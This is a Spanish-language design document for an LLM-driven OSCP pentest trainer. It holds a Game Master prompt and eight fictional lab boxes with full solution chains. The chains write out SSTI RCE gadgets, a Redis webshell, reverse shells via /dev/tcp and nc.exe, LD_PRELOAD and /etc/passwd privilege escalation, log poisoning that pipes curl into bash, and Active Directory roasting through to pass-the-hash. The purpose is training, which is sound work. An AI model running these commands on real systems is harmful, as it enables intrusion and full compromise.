# 🎮 Box Master — LLM-driven pentest methodology trainer

> Un entrenador de **método** (no de explotación real) dirigido por un LLM.
> El alumno conduce; el LLM hace de **caja objetivo** + **oráculo/coach**.
> Autor: David Teruel · formato v1

---

## Qué es (y qué NO es)

**Qué es:** entrena la **capa de decisión** del pentest — enumeración disciplinada, identificación del vector, elección de técnica y recuerdo de la chuleta/metodología. Pensado para repasar a diario sin montar una VM.

**Qué NO es (decirlo siempre):**
- No entrena explotación real: el LLM *simula* salidas verosímiles; no valida exploits ni sintaxis de payloads, y puede aceptar un comando erróneo como válido. **Complementa** HTB/PG/labs, no los sustituye.
- "Entrenar otros LLMs" = pasarles este **Game Master prompt + una box spec** como contexto (few-shot), no fine-tuning.

**Cómo se usa:** pega el *Game Master Prompt* + **una** box spec como contexto en cualquier LLM capaz. El alumno empieza a jugar.

---

## 🧙 GAME MASTER PROMPT (pégalo como system/contexto)

```
Eres el GAME MASTER de un juego de tutoría pentest estilo OSCP, en vivo, en español, directo y al grano.

TU DOBLE ROL:
1) LA CAJA: dado el comando EXACTO del alumno, devuelves la salida realista (terminal/HTTP) coherente con el ESTADO SECRETO de la box spec. No inventas vulnerabilidades que no estén en la spec. Si el comando tiene un typo o flag mal, reflejas el error realista.
2) EL ORÁCULO: cuando el alumno se atasca, das el MÍNIMO empujón y le señalas qué sección de SU chuleta/metodología debería haberle sacado. Nunca resuelves la cadena por él.

REGLAS DE ORO:
- El alumno DECIDE cada paso. Nunca avanzas la cadena tú. Si solo dice una intención ("miro la web"), puedes renderizar la enumeración natural de ese paso, pero las DECISIONES de vector/explotación las toma él.
- Coherencia total con el estado secreto: credenciales, rutas y flags solo aparecen cuando las acciones del alumno los sacarían de verdad.
- Flags tal cual la spec. No regalas flags.
- Al conseguir root/objetivo: debrief corto → (a) resumen de la cadena, (b) qué hizo bien, (c) su punto flojo, (d) la UNA regla a interiorizar.

ESCALERA DE PISTAS (sube un peldaño solo si sigue atascado):
  1. Señala la sección de la chuleta / el paso del protocolo anti-bloqueo.
  2. Nombra la CLASE de vulnerabilidad.
  3. Da el detector/comando exacto.

DIFICULTAD: respeta la cadena prevista de la spec; el único "ruido" permitido es el que la spec marque como red herring / baseline (SUID estándar, getcap de ruido, etc.). No metas madrigueras extra.

TONO: como un mentor de OSCP — seco, honesto, sin paños calientes, en español.
```

---

## 🧩 ESQUEMA de BOX SPEC (plantilla)

```
id: NN
name: <nombre>
os: linux | windows
difficulty: easy | medium | hard
est_time: <min/horas>
tags: [web, git, ssti, capabilities, password-reuse, ...]

target_ip: <ip>
tun0_ip: <ip del atacante>

services:            # puerto -> servicio/version/notas
  22: OpenSSH ...
  80: Apache ...

surface:             # qué revela la enumeración en cada punto (web, cabeceras, pistas)
  - ...

chain:               # pasos ordenados: foothold -> lateral -> privesc
  - step: <nombre>
    trigger: <qué lo dispara>
    technique: <vuln/técnica>
    cheat_ref: <[[02-web]] etc.>
    aha: <la observación clave>
    expected_action: <qué debería hacer el alumno>
    hints: [pista1 -> sección, pista2 -> clase, pista3 -> comando]

creds:               # loot recuperable y dónde
  - ...

flags:
  user: <hash falso>
  root: <hash falso>

noise:               # baseline/red herrings a renderizar
  - ...
```

---

# 📦 LIBRERÍA DE CAJAS

> Spoiler: estas specs contienen la solución. No las leas si vas a jugarlas.

---

## Box 01 — `Keystone`

```
id: 01
name: Keystone
os: linux
difficulty: medium
est_time: 60-90 min
tags: [web, vhost, ssti, jinja2, linux-capabilities]

target_ip: 192.168.182.47
tun0_ip: 192.168.45.212

services:
  22: OpenSSH 8.9p1 Ubuntu (sin vector)
  80: Apache 2.4.52, title "Keystone Logistics"

surface:
  - Web 80 = folleto corporativo Bootstrap (Home/Services/About/Contact). Sin chicha.
  - Pista clave: el FOOTER de todas las páginas dice "keystone.local" -> hay que fuzzear vhosts.
  - ffuf de directorios en keystone.local: solo estáticos (dead end).
  - Vhost fuzzing (ffuf -H "Host: FUZZ.keystone.local" -fs <home>) -> portal.keystone.local
  - portal.keystone.local: app Flask hecha a mano. Cabecera Server: Werkzeug/Python.
    Campo ?name=... que REFLEJA la entrada ("Hello, <name>!").

chain:
  - step: foothold-ssti
    trigger: input reflejado en app Flask/Werkzeug
    technique: SSTI Jinja2
    cheat_ref: [[02-web]] (SSTI)
    aha: input reflejado + Server Werkzeug/Python = plantilla, no LFI ni cmdi
    expected_action: detector {{7*7}} -> 49; luego gadget lipsum.__globals__.os.popen(...)
    hints:
      - "input reflejado -> 3 puertas: comando, fichero (LFI) y PLANTILLA (SSTI). 02-web."
      - "es SSTI; confirma con una expresion en sintaxis de plantilla."
      - "?name={{7*7}} -> si da 49 es Jinja2. RCE: {{ lipsum.__globals__.os.popen('id').read() }}"
    resultado: RCE como usuario 'dev' (uid 1000)
  - step: privesc-capabilities
    trigger: sudo -l y SUID sin nada util
    technique: Linux capability cap_setuid en python
    cheat_ref: [[07-privesc-linux]] (Capabilities / ORDEN DE ATAQUE)
    aha: getcap -r / revela /usr/bin/python3.10 cap_setuid=ep
    expected_action: /usr/bin/python3.10 -c 'import os; os.setuid(0); os.execl("/bin/sh","sh")'
    hints:
      - "no improvises donde mirar; pasa el arbol de 07 en orden: sudo -l, SUID, CAPABILITIES, cron..."
      - "hay una capability peligrosa en un binario."

creds: (ninguna; cadena sin lateral)

flags:
  user: (en /home/dev/user.txt)
  root: a7f3c9e2b4d8166f0e5c1a9b2d4f7e30

noise:
  - SUID: baseline estandar de Ubuntu (sudo, su, passwd, mount...). Nada explotable.
  - getcap: /usr/bin/ping cap_net_raw y gst-ptp-helper = ruido; la buena es python3.10.
```

**Lección pedagógica de la caja:** el input reflejado tiene TRES clases (cmdi / LFI / SSTI); el alumno tiende a olvidar SSTI. Y en privesc: ejecutar el checklist mecánicamente en vez de "elegir dónde mirar".

---

## Box 02 — `Ledger`

```
id: 02
name: Ledger
os: linux
difficulty: medium
est_time: 45-75 min
tags: [web, git-dumper, password-reuse, ssh, sudo-gtfobins]

target_ip: 192.168.182.61
tun0_ip: 192.168.45.212

services:
  22: OpenSSH 8.2p1 Ubuntu (via password reuse)
  80: Apache 2.4.41, PHP 7.4.3, title "Ledger — Internal Accounting"

surface:
  - Web 80 = login de contabilidad (login.php, prepared statements -> sin SQLi facil).
  - Codigo fuente: comentario "<!-- TODO: move secrets out of repo before go-live -->" (pista .git).
  - ffuf -> /.git/ expuesto (301). curl /.git/HEAD confirma.

chain:
  - step: foothold-git
    trigger: /.git/ expuesto
    technique: git-dumper + revisar commits borrados
    cheat_ref: [[02-web]] (git-dumper)
    aha: git log --oneline --all; HEAD "remove secrets" -> el secreto esta en commit anterior
    expected_action: git-dumper http://IP/.git/ ./loot; git log --oneline --all; git show 7d1e4b8
    hints:
      - "el comentario grita repo; fuzzea .git y vuelcalo."
      - "mira los commits ANTIGUOS, no solo HEAD. git log --oneline --all."
    resultado: includes/db.php con $DB_PASS='Sup3rL3dg3r#2023!'; autor del commit = Mike Hanson <mike@ledger.local>
  - step: lateral-reuse
    trigger: password del repo + nombre del autor
    technique: password reuse -> SSH
    cheat_ref: 00-INDICE protocolo anti-bloqueo #4
    aha: ledger_app no es user del sistema; el autor 'mike' SI -> reuse por SSH
    expected_action: ssh mike@IP con Sup3rL3dg3r#2023!
    hints:
      - "una credencial se prueba en TODAS partes, no solo en el form. Protocolo #4."
      - "tienes una pass y un nombre (el autor del commit)."
    resultado: shell como mike (uid 1001), user.txt
  - step: privesc-sudo-gtfobins
    trigger: sudo -l (con la pass de mike)
    technique: sudo GTFOBins (awk)
    cheat_ref: [[07-privesc-linux]] + GTFOBins
    aha: (root) NOPASSWD: /usr/bin/awk
    expected_action: sudo /usr/bin/awk 'BEGIN {system("/bin/sh")}'
    hints:
      - "sudo -l ahora SI (tienes pass). Si sale un binario raro -> GTFOBins seccion sudo."

creds:
  - ledger_app : Sup3rL3dg3r#2023!  (DB; reutilizada por mike en SSH)
  - mike : Sup3rL3dg3r#2023!  (SSH)

flags:
  user: c4e91f8a0b7d2356e1f9a4c8b2d6e0f3
  root: f20b9a7c1e634d85a0f2c6b9d4e81377

noise:
  - login.php usa prepared statements (SHA2) -> SQLi es callejon sin salida a proposito.
  - SUID y getcap: baseline, nada.
```

**Lección pedagógica:** no empeñarse en un vector muerto (el form) → pivotar a reuse; y el patrón "credencial encontrada = probarla en todo".

---

## Box 03 — `Cobalt`

```
id: 03
name: Cobalt
os: linux
difficulty: medium-hard
est_time: 60-90 min
tags: [redis, unauth, webshell, rce, cron, writable-script, pspy]

target_ip: 192.168.182.73
tun0_ip: 192.168.45.212

services:
  22: OpenSSH 8.2p1 Ubuntu (sin vector directo)
  80: Apache 2.4.41, title "Cobalt — Coming Soon" (webroot /var/www/html)
  6379: Redis 6.0.16 SIN AUTH

surface:
  - Redis 6379 responde PONG sin auth. info server -> version/os/config_file. config get dir -> /var/lib/redis.
  - CLAVE: Redis NO lee ficheros ni navega directorios; solo ESCRIBE (CONFIG SET dir + dbfilename + SAVE).

chain:
  - step: foothold-redis-webshell
    trigger: Redis unauth + Apache en 80
    technique: Redis RCE escribiendo webshell en el webroot
    cheat_ref: [[14-servicios]] (Redis)
    aha: Redis = primitiva de ESCRITURA; planta un .php en /var/www/html
    expected_action: |
      redis-cli -h IP config set dir /var/www/html
      redis-cli -h IP config set dbfilename shell.php
      redis-cli -h IP set x '<?php system($_GET["c"]); ?>'
      redis-cli -h IP save
      curl 'http://IP/shell.php?c=id'   -> uid=33(www-data)
    hints:
      - "redis-cli no hace ls ni lee ficheros; solo escribe (dir+dbfilename+save). 14-servicios."
      - "tres rutas: authorized_keys, webshell al webroot, modulo/Lua. Con Apache delante -> webshell."
    resultado: RCE como www-data
    nota: authorized_keys tambien valdria, pero SSH a la cuenta de servicio 'redis' es raro (buen criterio descartarla)
  - step: privesc-writable-cron
    trigger: sudo / SUID / capabilities secos
    technique: script escribible ejecutado por root via cron ("yo escribo / root ejecuta")
    cheat_ref: [[07-privesc-linux]] (cron) + doctrina 00-INDICE
    aha: pspy64 muestra UID=0 ejecutando /opt/maintenance/cleanup.sh cada minuto; el .sh es -rwxrwxrwx
    expected_action: |
      echo "bash -c 'bash -i >& /dev/tcp/TUN0/9001 0>&1'" >> /opt/maintenance/cleanup.sh
      nc -lvnp 9001   -> root en <=60s
    hints:
      - "sudo/SUID/caps secos -> mira lo que corre solo cada X tiempo. Necesitas pspy."
      - "comprueba permisos del .sh (ls -la) y su contenido (cat)."
    nota_reverse: verificar siempre que la IP de la reverse es la propia real (en la sesion fue la de ejemplo por defecto de revshells, no un error)

creds: (ninguna; redis sin auth, sin paso lateral)

flags:
  user: (www-data; en webroot/home)
  root: 3b9f1c7e0a24d6859f3e1b7c0d82a4f6

noise:
  - SUID/getcap: baseline; solo ping cap_net_raw de ruido.
  - RDB binario alrededor del PHP en el webshell: ignorar, el <?php ?> ejecuta igual.
```

**Lección pedagógica:** Redis unauth = primitiva de **escritura**, no de lectura/exploración (no se "navegan" directorios, se planta un fichero). Y el killer de examen: **usar siempre la `tun0` correcta** en la reverse shell.

---

## Box 04 — `Vault`

```
id: 04
name: Vault
os: windows
difficulty: medium
est_time: 45-75 min
tags: [smb, null-session, guest, cred-in-share, password-reuse, winrm, seimpersonate, printspoofer]

target_ip: 192.168.182.90
tun0_ip: (ejemplo)

services:
  135/139/445: SMB — Windows Server 2019, host VAULT (standalone, sin dominio)
  3389: RDP
  5985: WinRM

surface:
  - La VERSION ya sale en nmap (rdp-ntlm-info Product_Version 10.0.17763) y en nxc (Server 2019 Build 17763). Leer TODO el output -> no re-descubrir con systeminfo.
  - smbclient -N -L //IP/ -> share no estandar "Transfer".
  - nxc smb IP -u '' -p '' --shares -> Guest valido, Transfer = READ.

chain:
  - step: foothold-cred-in-share
    trigger: share Transfer legible por Guest
    technique: credenciales hardcodeadas en un .ps1 del share
    cheat_ref: [[14-servicios]] (SMB) + [[12-post-explotacion]]
    aha: config.Backup.ps1 lleva VAULT\svc_backup : B@ckup#Str0ng!2026 en texto plano
    expected_action: smbclient -N //IP/Transfer ; prompt off ; mget * ; cat config.Backup.ps1
    hints:
      - "Guest+READ en un share no default -> descarga y lee TODO, .ps1 incluido (es texto)."
  - step: lateral-reuse-winrm
    trigger: credencial del .ps1
    technique: password reuse / spraying
    cheat_ref: 00-INDICE protocolo anti-bloqueo #4
    aha: nxc smb/rdp/winrm -> winrm marca (Pwn3d!)
    expected_action: nxc {smb,rdp,winrm} IP -u svc_backup -p '...' ; evil-winrm -i IP -u svc_backup -p '...'
    hints:
      - "credencial encontrada -> probarla en smb/rdp/winrm. (Pwn3d!) en winrm = evil-winrm."
    resultado: shell como vault\svc_backup, user.txt
  - step: privesc-seimpersonate
    trigger: whoami /priv
    technique: SeImpersonate -> PrintSpoofer (ataque potato)
    cheat_ref: [[06-privesc-windows]] (tabla selectora de potatoes)
    aha: SeImpersonatePrivilege Enabled + Server 2019 -> PrintSpoofer (JuicyPotato ya no va; GodPotato de respaldo)
    expected_action: |
      (subir PrintSpoofer64.exe y nc.exe a C:\Windows\Temp)
      .\PrintSpoofer64.exe -c "C:\Windows\Temp\nc.exe TUN0 5555 -e cmd.exe"
      nc -lvnp 5555  -> nt authority\system
    hints:
      - "cuenta de servicio con SeImpersonate -> potato. Elige la potato por version de Windows (06, tabla)."
      - "la reverse con nc.exe es mas fiable que -i -c cmd por WinRM."

creds:
  - VAULT\svc_backup : B@ckup#Str0ng!2026  (hardcodeada en config.Backup.ps1 del share Transfer)

flags:
  user: 9d4b1f7a0c2e6835a1f9b4c7d2e80f63
  root: e7c2a9f14b86d0352f1e9c7a0b4d86f3

noise:
  - IT-Onboarding.txt: flavor (convencion de nombres svc_*), sin secreto directo.
  - ADMIN$/C$ no accesibles con Guest.
```

**Lección pedagógica:** en Windows, leer la versión del output que **ya tienes** (no re-descubrirla tarde); cadena share→credencial→reuse→WinRM; y `SeImpersonate` → potato elegida **por versión**.

---

## Box 05 — `Sentinel`

```
id: 05
name: Sentinel
os: windows
difficulty: medium (AD, single DC)
est_time: 60-90 min
tags: [active-directory, rid-brute, asrep-roast, kerberoast, backup-operators, sebackupprivilege, ntds, pth]

target_ip: 192.168.182.120
tun0_ip: (ejemplo)
domain: sentinel.local
dc: SENTINEL-DC (SENTINEL-DC.sentinel.local)

services: DC completo (53,88,135,139,389,445,464,636,3268,3269,5985,9389). Server 2019.

surface:
  - Recordar: /etc/hosts con FQDN (sentinel.local + SENTINEL-DC) desde el principio (Kerberos/BloodHound).
  - nxc smb -u '' -p '' --shares -> Guest valido, solo IPC$ READ (SYSVOL/NETLOGON piden creds).

chain:
  - step: enum-users
    trigger: null session / IPC$
    technique: RID brute (o LDAP anonimo)
    cheat_ref: [[08-active-directory]] (RID-brute)
    expected_action: nxc smb IP -u '' -p '' --rid-brute  -> users (j.reed, a.powell, t.harris, m.dolan, svc_backup, svc_web)
  - step: foothold-asrep
    trigger: Kerberos (88) + lista de users
    technique: AS-REP roasting (usuario sin preauth)
    cheat_ref: [[08-active-directory]] (AS-REP)
    aha: solo j.reed tiene UF_DONT_REQUIRE_PREAUTH
    expected_action: |
      impacket-GetNPUsers sentinel.local/ -usersfile users.txt -dc-ip IP -no-pass
      hashcat -m 18200 hash rockyou  (straight primero) -> j.reed:Summer2021
    hints:
      - "Kerberos abierto + users -> AS-REP roast (GetNPUsers -no-pass). -m 18200."
  - step: lateral-kerberoast
    trigger: creds de dominio (j.reed) validas en SMB/LDAP pero NO WinRM
    technique: Kerberoasting
    cheat_ref: [[08-active-directory]] (Kerberoast)
    aha: svc_backup tiene SPN y MemberOf = Backup Operators
    expected_action: |
      impacket-GetUserSPNs sentinel.local/j.reed:'Summer2021' -dc-ip IP -request -outputfile kerb.txt
      hashcat -m 13100 kerb.txt rockyou -> svc_backup:Liverpool08
    hints:
      - "usuario de dominio autenticado -> Kerberoast (GetUserSPNs -request). -m 13100."
  - step: privesc-backup-operators   # <-- EL HUECO QUE SE AÑADIO A LA CHULETA
    trigger: svc_backup in Backup Operators, sin WinRM, no admin
    technique: SeBackupPrivilege remoto (sin shell) -> dump NTDS
    cheat_ref: [[08-active-directory]] (Backup Operators REMOTO - anadido tras esta caja)
    aha: nxc --ntds NO vale (pide admin/VSS); Backup Operators se abusa por SMB en remoto
    expected_action: |
      impacket-reg sentinel.local/svc_backup:'Liverpool08'@IP backup   # SYSTEM/SAM/SECURITY
      # + BackupOperatorToolkit para ntds.dit
      impacket-secretsdump -ntds ntds.dit -system SYSTEM.save LOCAL -> Administrator NT hash
    hints:
      - "con shell seria diskshadow/vshadow; SIN shell = remoto por SMB (impacket-reg + tool NTDS)."
      - "--ntds de nxc pide admin (VSS); Backup Operators no es admin."
  - step: da-pth
    technique: Pass-the-Hash
    expected_action: evil-winrm -i IP -u Administrator -H 2892d26cdf84d7a70e2eb3b9f05c425e
    resultado: sentinel\administrator (dominio comprometido)

creds:
  - j.reed : Summer2021        (AS-REP roast)
  - svc_backup : Liverpool08   (Kerberoast; Backup Operators)
  - Administrator : NT 2892d26cdf84d7a70e2eb3b9f05c425e  (NTDS)

flags:
  root: b61d8c47f0a293e5147b9c6a2f0d8e31  (DC Administrator Desktop)

noise:
  - svc_web tambien es Kerberoastable pero su pass resiste rockyou (callejon).
  - signing:True en el DC (normal).
```

**Lección pedagógica (cadena AD completa — el hueco real del examen):** RID-brute → AS-REP → Kerberoast → **Backup Operators remoto SIN shell** (la pieza que faltaba en la chuleta) → NTDS → PtH. La clave conceptual: una cuenta `backup` que no entra por WinRM NO es inútil; su valor es **leer el NTDS en remoto**.

---

## Box 06 — `Relay`

```
id: 06
name: Relay
os: linux
difficulty: medium
est_time: 30-45 min
tags: [web, cms, default-creds, file-upload, rce, sudo, ld_preload, env_keep]

target_ip: 192.168.182.140
tun0_ip: (ejemplo)

services:
  22: OpenSSH 8.2p1 Ubuntu
  80: Apache 2.4.41, PHP 7.4, "Relay — Admin Console" (Relay CMS v1.2)

surface:
  - Login panel; comentario HTML insinua default creds -> admin:admin funciona.
  - Dashboard: Media/Uploads (SIN filtro de extension) y Theme Editor (.php). Dos caminos -> mismo www-data.

chain:
  - step: foothold-upload
    technique: default creds -> subida de webshell PHP sin filtro de extension
    cheat_ref: [[02-web]]
    expected_action: admin:admin -> subir shell.php a /uploads -> curl ?cmd=id -> uid=33(www-data) -> reverse (curl|bash)
    hints: ["el comentario HTML insinua default creds; prueba admin:admin."]
  - step: privesc-ld-preload
    trigger: sudo -l
    technique: sudo env_keep+=LD_PRELOAD + binario permitido como root
    cheat_ref: [[07-privesc-linux]] (LD_PRELOAD)
    aha: Defaults incluye env_keep+=LD_PRELOAD  Y  (root) NOPASSWD: /usr/sbin/apache2ctl
    expected_action: |
      // x.c:  void _init(){ unsetenv("LD_PRELOAD"); setuid(0); setgid(0); system("/bin/bash -p"); }
      gcc -fPIC -shared -nostartfiles -o /tmp/x.so /tmp/x.c
      sudo LD_PRELOAD=/tmp/x.so /usr/sbin/apache2ctl   -> root
    hints:
      - "sudo -l con env_keep+=LD_PRELOAD + un binario como root -> LD_PRELOAD (.so con _init). 07."

creds:
  - admin : admin   (Relay CMS, web)

flags:
  root: 5c1a9f3e7b204d86c0f1a9b4e7d2c806

noise:
  - Theme Editor = segundo camino web al MISMO www-data (no da privesc extra).
  - SUID/caps/pspy innecesarios; sudo -l resuelve.
```

**Lección pedagógica:** varios caminos web pueden desembocar en la **misma cuenta de servicio** (no malgastar tiempo); y `sudo` con **`env_keep+=LD_PRELOAD`** + cualquier binario como root = root (la variable que sudo NO limpia es el agujero).

---

## Box 07 — `Mint`

```
id: 07
name: Mint
os: linux
difficulty: medium
est_time: 30-40 min
tags: [web, lfi, log-poisoning, php-wrappers, nfs, no_root_squash]

target_ip: 192.168.182.155
tun0_ip: (ejemplo)

services:
  22: OpenSSH 8.2p1 Ubuntu
  80: Apache 2.4.41, PHP 7.4, "Mint — Blog"
  111 + 2049: NFS (rpcbind + mountd)

surface:
  - index.php?page=<x> -> LFI (include directo, SIN añadir .php). Rutas absolutas NO; traversal ../../../etc/passwd SI.
  - php://filter lee la fuente; data:// y php://input NO ejecutan (allow_url_include=Off).
  - id_rsa de los users NO legibles (600; el include corre como www-data).
  - cat /etc/exports -> /opt/backups *(rw,sync,no_root_squash)

chain:
  - step: foothold-lfi-logpoison
    technique: LFI -> log poisoning (User-Agent en access.log) -> RCE
    cheat_ref: [[02-web]] (LFI / wrappers / log poisoning)
    aha: los wrappers LEEN pero no EJECUTAN (allow_url_include Off) -> log poisoning es la via universal
    expected_action: |
      curl -s "http://IP/" -A "<?php system(\$_GET['c']); ?>"
      curl "http://IP/index.php?page=/var/log/apache2/access.log&c=id"   -> uid=33(www-data)
      (&c=curl+http://TU_IP/shell.sh|bash  -> reverse)
    hints:
      - "www-data no lee id_rsa 600; convierte LFI en RCE envenenando un log que SI puedas incluir."
      - "data://,php://input dependen de allow_url_include; si Off -> log poisoning."
  - step: privesc-nfs-norootsquash
    trigger: nmap 2049 + cat /etc/exports
    technique: NFS no_root_squash -> SUID root creado desde Kali
    cheat_ref: [[07-privesc-linux]] (NFS)
    aha: /opt/backups *(rw,no_root_squash) -> montar desde Kali (root) y plantar SUID bash
    expected_action: |
      # DESCUBRIR el export (ambas validas): cat /etc/exports (victima)  o  showmount -e IP (Kali)
      #   -> el path que devuelvan (aqui /opt/backups) es lo que va EN LUGAR del generico /srv/share de las notas.
      # Kali (root): mount -t nfs IP:/opt/backups /mnt/nfs -o nolock
      cp /bin/bash /mnt/nfs/rootbash ; chmod 4755 /mnt/nfs/rootbash
      # Victima (www-data): /opt/backups/rootbash -p   -> euid=0
    hints:
      - "no_root_squash: lo que creas como root por el mount queda root en la victima -> SUID bash."
      - "el path del export sale de cat /etc/exports (victima) o showmount -e IP (Kali); ESO sustituye a /srv/share."

creds: (ninguna)

flags:
  root: d80f2a16c4e9573b0a1f8c6d2e40b9f7

noise:
  - ?page con ruta absoluta no coge (include directo); solo traversal.
  - php://filter = solo lectura (no es el camino a RCE aqui).
```

**Lección pedagógica:** cadena de decisión del LFI — separar wrappers de **lectura** (php://filter) vs **ejecución** (data://, php://input, dependientes de `allow_url_include`); si ejecución capada → **log poisoning** (universal). Privesc: NFS `no_root_squash` = SUID root plantado desde Kali.

---

## Box 08 — `Harbor`

```
id: 08
name: Harbor
os: linux
difficulty: medium
est_time: ~30 min
tags: [web, sqli, union, mysql, hash-cracking, md5, password-reuse, ssh, writable-etc-passwd]

target_ip: 192.168.182.170
tun0_ip: (ejemplo)

services:
  22: OpenSSH 8.2p1 Ubuntu
  80: Apache 2.4.41, PHP 7.4, "Harbor Shipping — Tracking"

surface:
  - track.php?id=<n> -> SQLi string-based. id=1' = error MySQL; id=1 or 1=1 dumpea todo.
  - UNION 3 columnas (order by 4 falla). database()/user()/@@version reflejan en los 3 huecos.
  - information_schema -> tabla users (username, password).

chain:
  - step: foothold-sqli
    technique: UNION-based SQLi -> dump users -> crack MD5 -> SSH (reuse)
    cheat_ref: [[03-sqli-bbdd]] + [[05-cracking]]
    expected_action: |
      order by N-- (-> 3 columnas) ; UNION SELECT 1,2,3 (reflejo) ;
      UNION SELECT table_name,column_name,table_schema FROM information_schema.columns WHERE table_schema=database() ;
      UNION SELECT id,username,password FROM users
      hashcat -m 0 (MD5): admin:password, jmccoy:abc123   (rsantos bcrypt NO cae)
      nxc ssh IP -u jmccoy -p abc123  -> valido -> ssh jmccoy
    hints:
      - "UNION: cuenta columnas (order by N), mira reflejo (union select 1,2,3), luego information_schema (tablas->columnas->datos)."
      - "MD5 crudo = hashcat -m 0."
  - step: privesc-writable-passwd
    trigger: sudo / SUID / capabilities secos
    technique: /etc/passwd world-writable -> anadir usuario con UID 0
    cheat_ref: [[07-privesc-linux]] (ficheros escribibles sensibles)
    aha: ls -la /etc/passwd  = -rw-rw-rw-
    expected_action: |
      openssl passwd w00t                 # -> Fdzt.eqJQ4s0g (DES crypt)
      echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
      su root2    (pass: w00t)            # -> uid=0
    hints:
      - "secos sudo/SUID/caps -> ficheros escribibles SENSIBLES. Busca -type f (no -type d): ls -la /etc/passwd."
      - "/etc/passwd escribible -> entrada con 2do campo = hash (openssl passwd) y UID 0 -> su."

creds:
  - admin : password   (MD5, solo web - no cuenta del sistema)
  - jmccoy : abc123     (MD5; valida por SSH)
  - rsantos : bcrypt    (no crackea, no hace falta)

flags:
  user: 7b1f9c4a0e2d6835a1f0c9b7d4e82f60
  root: a4f08c217e6b395d0c1f9a4b8e7d2063

noise:
  - admin no es usuario del sistema (callejon para SSH).
  - find -writable -type d despista: el agujero es un FICHERO (-type f) -> /etc/passwd.
  - rsantos bcrypt = trampa de tiempo (no lo cracks).
```

**Lección pedagógica:** SQLi UNION completa (contar columnas → reflejo → information_schema tablas/columnas → dump) + crack MD5 (`-m 0`) + reuse en SSH; privesc por **`/etc/passwd` escribible** (buscar ficheros sensibles `-type f`, no directorios).

---

## 📈 Ideas de evolución (roadmap del proyecto)

- Añadir cajas Windows (SeImpersonate → PrintSpoofer/GodPotato) y AD (roasting → DCSync) con el mismo esquema.
- Etiquetar cada caja por técnica para generar "rutas" temáticas (ruta web, ruta AD, ruta privesc).
- Un "modo examen": 3 cajas seguidas sin pistas, el GM solo puntúa.
- README del repo que deje MUY claro el alcance honesto (método, no explotación real).
```
